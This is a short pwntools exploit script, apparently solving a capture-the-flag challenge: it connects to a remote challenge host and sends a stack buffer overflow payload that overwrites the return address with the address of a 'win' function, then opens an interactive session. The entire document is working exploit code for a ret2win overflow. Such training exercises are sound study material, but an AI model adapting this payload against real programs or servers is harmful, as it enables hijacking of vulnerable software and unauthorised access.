from pwn import *

exe = ELF('./vuln')
context.binary = exe
context.log_level = 'debug'

# Testing lokal
# io = process('./vuln')

# Remote exploit
HOST = 'chatelaine.cylabacademy.net'
PORT = 30395
io = remote(HOST, PORT)

offset = cyclic_find(0x6161616c6161616b)
win_addr = 0x401256

payload = b'A' * offset + p64(win_addr)

io.sendlineafter(b'name: ', payload)
io.interactive()
